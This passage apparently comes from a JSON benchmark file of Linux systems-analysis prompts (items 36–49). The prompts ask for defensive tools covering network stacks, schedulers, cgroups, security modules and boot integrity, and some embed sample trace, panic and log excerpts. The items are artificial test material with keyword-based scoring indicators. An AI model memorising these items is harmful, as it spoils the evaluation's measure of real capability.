          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_36",
      "name": "Test 36: Network Stack Internals",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nBuild a deep network stack analyzer:\n1. Parse /proc/net/* to extract detailed network statistics\n2. Monitor TCP connection states and detect anomalies (SYN floods, TIME_WAIT accumulation)\n3. Track network buffer usage (socket buffers, ring buffers) and detect exhaustion\n4. Analyze netfilter connection tracking table for NAT/firewall performance\n5. Monitor interrupt distribution across CPUs for network interfaces\n6. Track TCP retransmissions, out-of-order packets, and duplicate ACKs\n7. Detect network stack tuning issues (small buffers, suboptimal congestion control)\n8. Use ss and netstat data to identify connection leaks\n9. Monitor network namespace usage and inter-namespace communication\nInclude eBPF hooks to trace packet flow through the network stack.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a deep network stack analyzer:\n1. Parse /proc/net/* to extract detailed network statistics\n2. Monitor TCP connection states and detect anomalies (SYN floods, TIME_WAIT accumulation)\n3. Track network buffer usage (socket buffers, ring buffers) and detect exhaustion\n4. Analyze netfilter connection tracking table for NAT/firewall performance\n5. Monitor interrupt distribution across CPUs for network interfaces\n6. Track TCP retransmissions, out-of-order packets, and duplicate ACKs\n7. Detect network stack tuning issues (small buffers, suboptimal congestion control)\n8. Use ss and netstat data to identify connection leaks\n9. Monitor network namespace usage and inter-namespace communication\nInclude eBPF hooks to trace packet flow through the network stack.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_37",
      "name": "Test 37: Process Scheduler Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a process scheduler analyzer:\n1. Monitor /proc/sched_debug to understand scheduler behavior\n2. Track process migration between CPUs and NUMA nodes\n3. Analyze scheduling latency and identify processes experiencing starvation\n4. Monitor real-time process behavior and deadline misses\n5. Track CPU affinity settings and their effectiveness\n6. Identify priority inversion scenarios\n7. Monitor cgroup CPU accounting and quota enforcement\n8. Analyze the impact of kernel preemption on latency-sensitive workloads\n9. Detect scheduler anomalies that might indicate malicious activity\nGenerate recommendations for scheduler tuning based on workload characteristics.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a process scheduler analyzer:\n1. Monitor /proc/sched_debug to understand scheduler behavior\n2. Track process migration between CPUs and NUMA nodes\n3. Analyze scheduling latency and identify processes experiencing starvation\n4. Monitor real-time process behavior and deadline misses\n5. Track CPU affinity settings and their effectiveness\n6. Identify priority inversion scenarios\n7. Monitor cgroup CPU accounting and quota enforcement\n8. Analyze the impact of kernel preemption on latency-sensitive workloads\n9. Detect scheduler anomalies that might indicate malicious activity\nGenerate recommendations for scheduler tuning based on workload characteristics.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_38",
      "name": "Test 38: Virtual Memory Subsystem Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDevelop a comprehensive virtual memory analyzer:\n1. Parse /proc/vmstat and /proc/meminfo to track memory subsystem behavior\n2. Monitor page fault rates (minor vs major) and their impact on performance\n3. Track swap usage patterns and identify thrashing conditions\n4. Analyze transparent huge page (THP) usage and effectiveness\n5. Monitor memory compaction events and fragmentation levels\n6. Track dirty page writeback behavior and I/O patterns\n7. Analyze NUMA memory allocation and migration statistics\n8. Detect memory pressure situations before OOM killer activation\n9. Monitor kernel memory usage (slab allocator statistics)\nInclude predictive analytics for memory exhaustion scenarios.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDevelop a comprehensive virtual memory analyzer:\n1. Parse /proc/vmstat and /proc/meminfo to track memory subsystem behavior\n2. Monitor page fault rates (minor vs major) and their impact on performance\n3. Track swap usage patterns and identify thrashing conditions\n4. Analyze transparent huge page (THP) usage and effectiveness\n5. Monitor memory compaction events and fragmentation levels\n6. Track dirty page writeback behavior and I/O patterns\n7. Analyze NUMA memory allocation and migration statistics\n8. Detect memory pressure situations before OOM killer activation\n9. Monitor kernel memory usage (slab allocator statistics)\nInclude predictive analytics for memory exhaustion scenarios.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_39",
      "name": "Test 39: Security Module Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nWrite a script to analyze Linux Security Module (LSM) configurations:\n1. Detect which LSMs are active (SELinux, AppArmor, SMACK, etc.)\n2. For SELinux: analyze policy violations in audit log, check for domains in permissive mode\n3. For AppArmor: parse loaded profiles, check for complain mode profiles\n4. Analyze capability usage by processes (both effective and permitted)\n5. Check for processes with dangerous capability combinations\n6. Monitor security module state changes and policy reloads\n7. Track security context transitions and domain changes\n8. Identify processes running unconfined or with elevated privileges\n9. Generate a security posture report with remediation recommendations\nInclude integration with auditd for comprehensive security event tracking.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script to analyze Linux Security Module (LSM) configurations:\n1. Detect which LSMs are active (SELinux, AppArmor, SMACK, etc.)\n2. For SELinux: analyze policy violations in audit log, check for domains in permissive mode\n3. For AppArmor: parse loaded profiles, check for complain mode profiles\n4. Analyze capability usage by processes (both effective and permitted)\n5. Check for processes with dangerous capability combinations\n6. Monitor security module state changes and policy reloads\n7. Track security context transitions and domain changes\n8. Identify processes running unconfined or with elevated privileges\n9. Generate a security posture report with remediation recommendations\nInclude integration with auditd for comprehensive security event tracking.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_40",
      "name": "Test 40: Interrupt and IRQ Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild an interrupt handling analyzer:\n1. Parse /proc/interrupts to track interrupt distribution across CPUs\n2. Identify interrupt storms and their sources\n3. Monitor IRQ affinity settings and balance effectiveness\n4. Track softirq processing time and identify bottlenecks\n5. Analyze MSI/MSI-X interrupt usage for PCI devices\n6. Detect interrupt sharing conflicts affecting performance\n7. Monitor threaded IRQ handler performance\n8. Track interrupt coalescing effectiveness for network interfaces\n9. Identify real-time latency issues caused by interrupt handling\nGenerate recommendations for interrupt tuning and CPU isolation.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an interrupt handling analyzer:\n1. Parse /proc/interrupts to track interrupt distribution across CPUs\n2. Identify interrupt storms and their sources\n3. Monitor IRQ affinity settings and balance effectiveness\n4. Track softirq processing time and identify bottlenecks\n5. Analyze MSI/MSI-X interrupt usage for PCI devices\n6. Detect interrupt sharing conflicts affecting performance\n7. Monitor threaded IRQ handler performance\n8. Track interrupt coalescing effectiveness for network interfaces\n9. Identify real-time latency issues caused by interrupt handling\nGenerate recommendations for interrupt tuning and CPU isolation.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_41",
      "name": "Test 41: Filesystem Internal Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a filesystem internals analyzer:\n1. For ext4: analyze journal status, inode usage, and fragmentation levels\n2. For XFS: monitor allocation groups, delayed allocation, and log performance\n3. For Btrfs: check scrub status, balance operations, and snapshot overhead\n4. Track inode cache and dentry cache effectiveness\n5. Monitor filesystem-specific caches and their hit rates\n6. Analyze mount options and their performance/security implications\n7. Detect filesystem corruption indicators in kernel logs\n8. Track filesystem freeze/thaw operations and their impact\n9. Monitor quota usage and enforcement\nInclude filesystem-specific health checks and optimization recommendations.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a filesystem internals analyzer:\n1. For ext4: analyze journal status, inode usage, and fragmentation levels\n2. For XFS: monitor allocation groups, delayed allocation, and log performance\n3. For Btrfs: check scrub status, balance operations, and snapshot overhead\n4. Track inode cache and dentry cache effectiveness\n5. Monitor filesystem-specific caches and their hit rates\n6. Analyze mount options and their performance/security implications\n7. Detect filesystem corruption indicators in kernel logs\n8. Track filesystem freeze/thaw operations and their impact\n9. Monitor quota usage and enforcement\nInclude filesystem-specific health checks and optimization recommendations.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_42",
      "name": "Test 42: Control Group (cgroup) Deep Dive",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive cgroup analyzer for both v1 and v2:\n1. Map the complete cgroup hierarchy and controller attachments\n2. Track resource usage (CPU, memory, I/O) per cgroup with historical data\n3. Monitor cgroup limit enforcement and throttling events\n4. Detect cgroup escape attempts and privilege escalation\n5. Analyze systemd slice/scope/service resource consumption\n6. Track cgroup migration events and their performance impact\n7. Monitor memory pressure notifications (cgroup v2)\n8. Analyze CPU bandwidth control and quota burn rates\n9. Detect resource starvation within cgroups\n10. Generate alerts for cgroup-based resource attacks\nInclude visualization of the cgroup hierarchy with resource usage heatmaps.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive cgroup analyzer for both v1 and v2:\n1. Map the complete cgroup hierarchy and controller attachments\n2. Track resource usage (CPU, memory, I/O) per cgroup with historical data\n3. Monitor cgroup limit enforcement and throttling events\n4. Detect cgroup escape attempts and privilege escalation\n5. Analyze systemd slice/scope/service resource consumption\n6. Track cgroup migration events and their performance impact\n7. Monitor memory pressure notifications (cgroup v2)\n8. Analyze CPU bandwidth control and quota burn rates\n9. Detect resource starvation within cgroups\n10. Generate alerts for cgroup-based resource attacks\nInclude visualization of the cgroup hierarchy with resource usage heatmaps.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_43",
      "name": "Test 43: Kernel Keyring Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a kernel keyring security analyzer:\n1. Enumerate all keyrings (session, process, thread, user, user-session)\n2. List keys in each keyring with their types, descriptions, and permissions\n3. Identify expired or revoked keys still in keyrings\n4. Check for overly permissive key access permissions\n5. Track key usage patterns and access attempts\n6. Monitor keyring quota usage and potential DoS vectors\n7. Detect suspicious key types or descriptions (potential malware indicators)\n8. Analyze encrypted key dependencies and trust chains\n9. Check for keys that should be in kernel lockdown\nInclude integration with IMA/EVM for system integrity verification.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a kernel keyring security analyzer:\n1. Enumerate all keyrings (session, process, thread, user, user-session)\n2. List keys in each keyring with their types, descriptions, and permissions\n3. Identify expired or revoked keys still in keyrings\n4. Check for overly permissive key access permissions\n5. Track key usage patterns and access attempts\n6. Monitor keyring quota usage and potential DoS vectors\n7. Detect suspicious key types or descriptions (potential malware indicators)\n8. Analyze encrypted key dependencies and trust chains\n9. Check for keys that should be in kernel lockdown\nInclude integration with IMA/EVM for system integrity verification.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_44",
      "name": "Test 44: NUMA System Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a NUMA-aware system optimizer:\n1. Map system NUMA topology including nodes, CPUs, and memory\n2. Analyze per-node memory usage and identify imbalances\n3. Track inter-node memory access latency and bandwidth\n4. Monitor NUMA page migration statistics and effectiveness\n5. Identify processes with poor NUMA locality\n6. Generate optimal CPU/memory pinning recommendations\n7. Analyze NUMA-aware scheduler decisions\n8. Track remote memory access penalties\n9. Monitor kernel NUMA balancing effectiveness\n10. Detect NUMA-related performance regressions\nInclude automated NUMA policy recommendations for different workload types.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a NUMA-aware system optimizer:\n1. Map system NUMA topology including nodes, CPUs, and memory\n2. Analyze per-node memory usage and identify imbalances\n3. Track inter-node memory access latency and bandwidth\n4. Monitor NUMA page migration statistics and effectiveness\n5. Identify processes with poor NUMA locality\n6. Generate optimal CPU/memory pinning recommendations\n7. Analyze NUMA-aware scheduler decisions\n8. Track remote memory access penalties\n9. Monitor kernel NUMA balancing effectiveness\n10. Detect NUMA-related performance regressions\nInclude automated NUMA policy recommendations for different workload types.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_45",
      "name": "Test 45: Boot Process Security Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_security",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux security",
      "prompt": "\nBuild a comprehensive boot security analyzer:\n1. Verify secure boot status and certificate chains\n2. Analyze UEFI variables for persistence mechanisms\n3. Check kernel command line for security-relevant parameters\n4. Verify initramfs integrity and contents\n5. Track module loading during boot and verify signatures\n6. Analyze systemd boot performance and security status\n7. Check for firmware vulnerabilities and available updates\n8. Monitor TPM usage and PCR values\n9. Verify dm-verity or dm-integrity usage for root filesystem\n10. Detect boot-time malware indicators\nGenerate a boot security score with specific hardening recommendations.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive boot security analyzer:\n1. Verify secure boot status and certificate chains\n2. Analyze UEFI variables for persistence mechanisms\n3. Check kernel command line for security-relevant parameters\n4. Verify initramfs integrity and contents\n5. Track module loading during boot and verify signatures\n6. Analyze systemd boot performance and security status\n7. Check for firmware vulnerabilities and available updates\n8. Monitor TPM usage and PCR values\n9. Verify dm-verity or dm-integrity usage for root filesystem\n10. Detect boot-time malware indicators\nGenerate a boot security score with specific hardening recommendations.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_46",
      "name": "Test 46: Comprehensive System Trace Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this 8000-line strace output from a complex multi-threaded application experiencing intermittent failures:\n\n[Begin strace output - in production this would be real trace data]\nexecve(\"/usr/bin/app\", [\"app\", \"--daemon\"], 0x7ffe93847840 /* 26 vars */) = 0\nbrk(NULL)                               = 0x560f2a9e2000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffde3b8c8a0) = -1 EINVAL\nmmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6a0e4aa000\n... [8000 more lines of syscalls including clone(), futex(), epoll_wait(), etc.]\n[End strace output]\n\nAnalyze this trace to:\n1. Map out all threads created and their relationships\n2. Identify all file descriptors opened, their types (files/sockets/pipes), and lifecycle\n3. Find race conditions between threads (especially around shared resources)\n4. Detect any TOCTOU (Time-of-check Time-of-use) vulnerabilities\n5. Map all network connections: when established, data transferred, and how closed\n6. Identify failed system calls and categorize them by type and frequency\n7. Find potential security issues: privilege changes, unsafe file operations, etc.\n8. Create a timeline of significant events with thread correlation\n9. Identify performance bottlenecks: blocking calls, repeated failures, etc.\n10. Generate specific line number references for each finding\nOutput a comprehensive security and performance assessment report.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this 8000-line strace output from a complex multi-threaded application experiencing intermittent failures:\n\n[Begin strace output - in production this would be real trace data]\nexecve(\"/usr/bin/app\", [\"app\", \"--daemon\"], 0x7ffe93847840 /* 26 vars */) = 0\nbrk(NULL)                               = 0x560f2a9e2000\narch_prctl(0x3001 /* ARCH_??? */, 0x7ffde3b8c8a0) = -1 EINVAL\nmmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6a0e4aa000\n... [8000 more lines of syscalls including clone(), futex(), epoll_wait(), etc.]\n[End strace output]\n\nAnalyze this trace to:\n1. Map out all threads created and their relationships\n2. Identify all file descriptors opened, their types (files/sockets/pipes), and lifecycle\n3. Find race conditions between threads (especially around shared resources)\n4. Detect any TOCTOU (Time-of-check Time-of-use) vulnerabilities\n5. Map all network connections: when established, data transferred, and how closed\n6. Identify failed system calls and categorize them by type and frequency\n7. Find potential security issues: privilege changes, unsafe file operations, etc.\n8. Create a timeline of significant events with thread correlation\n9. Identify performance bottlenecks: blocking calls, repeated failures, etc.\n10. Generate specific line number references for each finding\nOutput a comprehensive security and performance assessment report.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_47",
      "name": "Test 47: Kernel Oops/Panic Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this complete kernel panic dump and provide root cause analysis:\n\n[Begin kernel panic dump - in production this would be real panic data]\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000028\nIP: [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280 [my_driver]\nPGD 1a0b4a067 P4D 1a0b4a067 PUD 1a0b49067 PMD 0\nOops: 0000 [#1] SMP PTI\nCPU: 3 PID: 28239 Comm: test_app Tainted: G           O    4.15.0-200-generic\nHardware name: Dell Inc. PowerEdge R740/08D89F, BIOS 2.12.2 07/09/2021\nRIP: 0010:[<ffffffffa0358f61>]  [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280\nRSP: 0018:ffffa55a0a3c3d88  EFLAGS: 00010246\nRAX: 0000000000000000 RBX: ffff8f5a7e3a8000 RCX: 0000000000000000\n... [200 more lines of register dumps, stack traces, etc.]\n[End kernel panic dump]\n\nProvide:\n1. Root cause analysis of the crash with specific code path\n2. Identify the tainted flags and their implications\n3. Analyze the stack trace to understand the call chain\n4. Examine register values to understand the failure mode\n5. Check for common vulnerability patterns (null pointer, buffer overflow, etc.)\n6. Identify the module responsible and any version information\n7. Assess system impact and data corruption risks\n8. Provide specific debugging steps to reproduce/fix\n9. Analyze CPU and hardware information for relevance\n10. Generate remediation recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this complete kernel panic dump and provide root cause analysis:\n\n[Begin kernel panic dump - in production this would be real panic data]\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000028\nIP: [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280 [my_driver]\nPGD 1a0b4a067 P4D 1a0b4a067 PUD 1a0b49067 PMD 0\nOops: 0000 [#1] SMP PTI\nCPU: 3 PID: 28239 Comm: test_app Tainted: G           O    4.15.0-200-generic\nHardware name: Dell Inc. PowerEdge R740/08D89F, BIOS 2.12.2 07/09/2021\nRIP: 0010:[<ffffffffa0358f61>]  [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280\nRSP: 0018:ffffa55a0a3c3d88  EFLAGS: 00010246\nRAX: 0000000000000000 RBX: ffff8f5a7e3a8000 RCX: 0000000000000000\n... [200 more lines of register dumps, stack traces, etc.]\n[End kernel panic dump]\n\nProvide:\n1. Root cause analysis of the crash with specific code path\n2. Identify the tainted flags and their implications\n3. Analyze the stack trace to understand the call chain\n4. Examine register values to understand the failure mode\n5. Check for common vulnerability patterns (null pointer, buffer overflow, etc.)\n6. Identify the module responsible and any version information\n7. Assess system impact and data corruption risks\n8. Provide specific debugging steps to reproduce/fix\n9. Analyze CPU and hardware information for relevance\n10. Generate remediation recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_48",
      "name": "Test 48: Distributed System Log Correlation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze these logs from a distributed system experiencing cascading failures. Correlate events across 5 services:\n\n[Service A - API Gateway - 2000 lines]\n2024-01-15 10:15:23.456 INFO [req-123] Incoming request from 192.168.1.100\n2024-01-15 10:15:23.458 INFO [req-123] Forwarding to backend service B\n2024-01-15 10:15:28.458 ERROR [req-123] Timeout waiting for service B response\n... [1997 more lines]\n\n[Service B - Application Server - 2500 lines]\n2024-01-15 10:15:23.461 INFO [req-123] Received request from gateway\n2024-01-15 10:15:23.462 INFO [req-123] Querying database service C\n2024-01-15 10:15:25.462 WARN [req-123] Database query slow: 2000ms\n... [2497 more lines]\n\n[Service C - Database - 3000 lines]\n2024-01-15 10:15:23.463 INFO Connection from service B established\n2024-01-15 10:15:23.465 WARN Lock wait timeout on table 'users'\n2024-01-15 10:15:24.465 ERROR Deadlock detected, rolling back transaction\n... [2997 more lines]\n\n[Service D - Cache - 1500 lines]\n2024-01-15 10:15:22.100 INFO Cache memory usage at 95%\n2024-01-15 10:15:23.100 WARN Evicting 10000 entries due to memory pressure\n2024-01-15 10:15:24.100 ERROR Unable to allocate memory for new entries\n... [1497 more lines]\n\n[Service E - Message Queue - 2000 lines]\n2024-01-15 10:15:20.000 INFO Queue depth: 50000 messages\n2024-01-15 10:15:25.000 WARN Consumer lag increasing: 5 minutes behind\n2024-01-15 10:15:30.000 ERROR Queue full, rejecting new messages\n... [1997 more lines]\n\nAnalyze to:\n1. Create a unified timeline of events across all services\n2. Identify the root cause service and initial failure trigger\n3. Map the cascade pattern - how failure propagated\n4. Find critical points where cascade could have been prevented\n5. Identify missing error handling and timeout configurations\n6. Detect resource exhaustion patterns leading to failure\n7. Analyze retry storms and backpressure failures\n8. Find configuration mismatches between services\n9. Generate a service dependency failure map\n10. Provide specific remediation for each service\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze these logs from a distributed system experiencing cascading failures. Correlate events across 5 services:\n\n[Service A - API Gateway - 2000 lines]\n2024-01-15 10:15:23.456 INFO [req-123] Incoming request from 192.168.1.100\n2024-01-15 10:15:23.458 INFO [req-123] Forwarding to backend service B\n2024-01-15 10:15:28.458 ERROR [req-123] Timeout waiting for service B response\n... [1997 more lines]\n\n[Service B - Application Server - 2500 lines]\n2024-01-15 10:15:23.461 INFO [req-123] Received request from gateway\n2024-01-15 10:15:23.462 INFO [req-123] Querying database service C\n2024-01-15 10:15:25.462 WARN [req-123] Database query slow: 2000ms\n... [2497 more lines]\n\n[Service C - Database - 3000 lines]\n2024-01-15 10:15:23.463 INFO Connection from service B established\n2024-01-15 10:15:23.465 WARN Lock wait timeout on table 'users'\n2024-01-15 10:15:24.465 ERROR Deadlock detected, rolling back transaction\n... [2997 more lines]\n\n[Service D - Cache - 1500 lines]\n2024-01-15 10:15:22.100 INFO Cache memory usage at 95%\n2024-01-15 10:15:23.100 WARN Evicting 10000 entries due to memory pressure\n2024-01-15 10:15:24.100 ERROR Unable to allocate memory for new entries\n... [1497 more lines]\n\n[Service E - Message Queue - 2000 lines]\n2024-01-15 10:15:20.000 INFO Queue depth: 50000 messages\n2024-01-15 10:15:25.000 WARN Consumer lag increasing: 5 minutes behind\n2024-01-15 10:15:30.000 ERROR Queue full, rejecting new messages\n... [1997 more lines]\n\nAnalyze to:\n1. Create a unified timeline of events across all services\n2. Identify the root cause service and initial failure trigger\n3. Map the cascade pattern - how failure propagated\n4. Find critical points where cascade could have been prevented\n5. Identify missing error handling and timeout configurations\n6. Detect resource exhaustion patterns leading to failure\n7. Analyze retry storms and backpressure failures\n8. Find configuration mismatches between services\n9. Generate a service dependency failure map\n10. Provide specific remediation for each service\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_49",
      "name": "Test 49: Performance Profile Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
